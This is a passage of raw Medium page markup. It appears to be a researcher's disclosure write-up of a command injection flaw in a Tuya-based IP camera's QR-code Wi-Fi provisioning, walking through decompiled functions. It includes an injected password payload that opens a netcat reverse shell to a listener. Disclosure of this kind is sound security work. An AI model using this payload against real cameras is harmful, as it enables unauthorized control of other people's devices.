id="22e7" class="pw-post-body-paragraph mf mg gu mh b mi po mk ml mm pp mo mp mq pq ms mt mu pr mw mx my ps na nb nc gn bk"><strong class="mh gv">What is a QR Code:</strong></p><p id="f948" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Chatgpt — “A <strong class="mh gv">QR code</strong> (Quick Response code) is a type of two-dimensional barcode that can store information in a way that is easily scannable by devices like smartphones, tablets, and QR code readers.”</p><p id="5e57" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">The camera uses the QR code mechanism to connect to the Wifi of the user. When you open the camera when it’s not connected to any Wifi, it is in its provisioning mode, In that mode there is a thread that tries to scan a QR code from the camera’s POV. When it finds that QR Code, it should have a JSON with 3 parameters:<br/>s — SSID (Service Set Identifier) — your wifi name<br/>p — Password of the Wifi<br/>t — token<br/>Well basically we don’t care about how QR is implemented, the only thing we care about is how that connects to the vulnerability.</p><p id="f8d5" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Lets give a brief overview on how the exploit works and dive into the code:</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu pt"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 1100w, https://miro.medium.com/v2/resize:fit:1308/format:webp/1*jkIhqNMmtc4Cl5vVjZDxqw.png 1308w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 654px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jkIhqNMmtc4Cl5vVjZDxqw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jkIhqNMmtc4Cl5vVjZDxqw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jkIhqNMmtc4Cl5vVjZDxqw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jkIhqNMmtc4Cl5vVjZDxqw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jkIhqNMmtc4Cl5vVjZDxqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jkIhqNMmtc4Cl5vVjZDxqw.png 1100w, https://miro.medium.com/v2/resize:fit:1308/1*jkIhqNMmtc4Cl5vVjZDxqw.png 1308w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 654px"/><img alt="" class="bh lm ob c" width="654" height="1113" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">A Diagram that shows the flow of the code leading to the exploit</figcaption></figure><p id="21a0" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Basically that QR code thread is scanning QRs as we’ve already mentioned, it runs a loop and calls the magic function which I kept unnamed “sub_AD1D0” which calls some external libraries including zbar (for QR parsing), that function tries to scan a QR and returns a JSON of its content. If it finds a QR it will break the while and call the function qr_code_connect_wifi with the JSON as its parameter:</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu pu"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 1100w, https://miro.medium.com/v2/resize:fit:780/format:webp/1*hDKH9fIHR1hz_TlKP2G1-Q.png 780w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 390px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*hDKH9fIHR1hz_TlKP2G1-Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*hDKH9fIHR1hz_TlKP2G1-Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*hDKH9fIHR1hz_TlKP2G1-Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*hDKH9fIHR1hz_TlKP2G1-Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*hDKH9fIHR1hz_TlKP2G1-Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*hDKH9fIHR1hz_TlKP2G1-Q.png 1100w, https://miro.medium.com/v2/resize:fit:780/1*hDKH9fIHR1hz_TlKP2G1-Q.png 780w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 390px"/><img alt="" class="bh lm ob c" width="390" height="486" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">The QR Thread that runs in the background</figcaption></figure><p id="7d73" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">In that qr_code_connect_wifi function, we can see it parses the JSON from before and extracts the s, p, and b? Until now I didn’t know what that was supposed to be. I guess it’s a misspelling of t? The Tuya Smart Life application generates a token, which could have been used here but, it doesn’t? If they would use it mightv’e been harder to simply get the camera to parse any QR like it is now.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu pv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 1100w, https://miro.medium.com/v2/resize:fit:808/format:webp/1*QNeEuXA_K3ZMj1oNEX4QQg.png 808w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 404px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*QNeEuXA_K3ZMj1oNEX4QQg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*QNeEuXA_K3ZMj1oNEX4QQg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*QNeEuXA_K3ZMj1oNEX4QQg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*QNeEuXA_K3ZMj1oNEX4QQg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*QNeEuXA_K3ZMj1oNEX4QQg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*QNeEuXA_K3ZMj1oNEX4QQg.png 1100w, https://miro.medium.com/v2/resize:fit:808/1*QNeEuXA_K3ZMj1oNEX4QQg.png 808w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 404px"/><img alt="" class="bh lm ob c" width="404" height="489" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">qr_code_connect_wifi function contents</figcaption></figure><p id="63a2" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Lets leave all the other overflows aside, since they will anyways be much harder to implement, and we have the easier way.</p><p id="b37e" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">The vulnerability (well the worst one in that code) lies in the function sys_connect_wifi. who is being called with the SSID and password from the QR.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu pw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9TC97711Rc1vUILWLKKQOA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*9TC97711Rc1vUILWLKKQOA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*9TC97711Rc1vUILWLKKQOA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*9TC97711Rc1vUILWLKKQOA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*9TC97711Rc1vUILWLKKQOA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*9TC97711Rc1vUILWLKKQOA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*9TC97711Rc1vUILWLKKQOA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*9TC97711Rc1vUILWLKKQOA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lm ob c" width="700" height="530" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">I guess davis didn’t do a gj after all :( we still love you though ❤</figcaption></figure><p id="f851" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Again ignore the other vulnerabilities we have here and let’s focus on the worst one: as we can see from line 39 to 41, we are copying a string with who connects to the wifi with our ssid and password, but wait.. Why there is no sanitizing of our input? A classic command injection vulnerability.</p><p id="3505" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">From there it will enter system_cmd who will call system eventually and trigger our vulnerability.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu px"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 1100w, https://miro.medium.com/v2/resize:fit:622/format:webp/1*9725YUKUetM1m36rD6b2Nw.png 622w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 311px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*9725YUKUetM1m36rD6b2Nw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*9725YUKUetM1m36rD6b2Nw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*9725YUKUetM1m36rD6b2Nw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*9725YUKUetM1m36rD6b2Nw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*9725YUKUetM1m36rD6b2Nw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*9725YUKUetM1m36rD6b2Nw.png 1100w, https://miro.medium.com/v2/resize:fit:622/1*9725YUKUetM1m36rD6b2Nw.png 622w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 311px"/><img alt="" class="bh lm ob c" width="311" height="188" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">system_cmd function</figcaption></figure><h1 id="b873" class="or no gu bf os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn bk">Abusing the command injection</h1><p id="b333" class="pw-post-body-paragraph mf mg gu mh b mi po mk ml mm pp mo mp mq pq ms mt mu pr mw mx my ps na nb nc gn bk">The camera connects to the Wi-fi using a script called lv_wifi_connect.sh, since we are in provisioning mode, and we have no connection to our LAN from the camera, we can’t simply inject a Netcat reverse shell. We need first to connect the wifi and after that when we are connected, run a reverse shell from the camera and connect to our Netcat listener.</p><p id="2055" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Since both SSID and PASSWORD are contenders for the command injection, I have picked the password. And I injected the following line:</p><pre class="ne nf ng nh ni nj nk nl bp nm bb bk"><span id="0c49" class="nn no gu nk b bg np nq l nr ns">$(sh /usr/sbin/lv_wifi_connect.sh {SSID} {PASSWORD} &amp; sleep 30; nc {NC_IP} {NC_PORT} -e /bin/sh)<br/># Create a QR code with data</span></pre><p id="6cf4" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">What would happen here, is that the camera will parse the parameters, s, and p (will completely ignore t as we have said) and continue to the part where the vulnerability triggers, there instead of sending the lv_wifi_connect.sh script the password parameter, it will execute the connection to the WIFI, as set from the SSID and PASSWORD variables. Wait for a few seconds and then trigger a reverse shell that will connect to your listener.</p><p id="0a7a" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Unfortunately, TUYA has not responded for more than 90 days, and the bug has not been fixed.</p></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="py pz ab iv"><div class="qa ab"><a class="qb ay am ao" rel="noopener follow" href="/tag/vulnerability?source=post_page-----2d56848870c2--------------------------------"><div class="qc fj cx qd ge qe qf bf b bg z bk qg">Vulnerability</div></a></div><div class="qa ab"><a class="qb ay am ao" rel="noopener follow" href="/tag/ip-camera?source=post_page-----2d56848870c2--------------------------------"><div class="qc fj cx qd ge qe qf bf b bg z bk qg">Ip Camera</div></a></div></div><div class="qh le l"><div class="in"><span class="bf b bg z du"><svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 19 19"><g fill-rule="evenodd"><path d="M4.128 12.213A15.4 15.4 0 0 1 1.595 9.93a7 7 0 0 1-.167-.198l-.245-.305.245-.305a13 13 0 0 1 .63-.697A15.4 15.4 0 0 1 3.753 6.92c1.814-1.384 3.76-2.22 5.77-2.22.613 0 1.272.13 1.972.374l-.797.772a4.5 4.5 0 0 0-1.176-.172c-1.763 0-3.519.755-5.178 2.021-.588.448-1.12.93-1.588 1.41-.278.287-.278.36 0 .647a14.4 14.4 0 0 0 2.085 1.772zm3.048 1.57c.77.243 1.553.373 2.346.373.7 0 1.458-.168 2.268-.483.992-.385 2.038-.98 3.105-1.726a25 25 0 0 0 2.679-2.169l.366-.351-.366-.352a23 23 0 0 0-.763-.682 25 25 0 0 0-2.283-1.737l-.716.695a24 24 0 0 1 2.366 1.784c.2.17.2.414 0 .584-.57.488-1.192.975-1.841 1.43-1.009.705-1.99 1.263-2.9 1.616-.705.274-1.349.417-1.915.417a6.6 6.6 0 0 1-1.535-.186z"></path><path d="M12.053 9.056q.024.174.024.354c0 1.457-1.22 2.639-2.723 2.639a3 3 0 0 1-.365-.024zM9.719 6.794a3 3 0 0 0-.365-.023c-1.504 0-2.723 1.181-2.723 2.639q0 .18.025.354zM3.603 14.305l-.35.34.679.7.35-.34L14.685 4.921l.35-.339-.679-.7-.35.34z"></path></g></svg> Unlisted</span></div></div></div></div><div class="l"></div><footer class="qi qj qk ql qm ab q qn qo c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp qp"><div class="ab q ke"><div class="qq l"><span class="l qr qs qt e d"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F2d56848870c2&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&amp;user=Shenhav+Mor&amp;userId=f1f06bd2dad8&amp;source=---footer_actions--2d56848870c2---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span><span class="l h g f qu qv"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F2d56848870c2&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&amp;user=Shenhav+Mor&amp;userId=f1f06bd2dad8&amp;source=---footer_actions--2d56848870c2---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="qw l is"></div><div class="qw l is"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al ln an ao ap ex lo lp ld lq"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 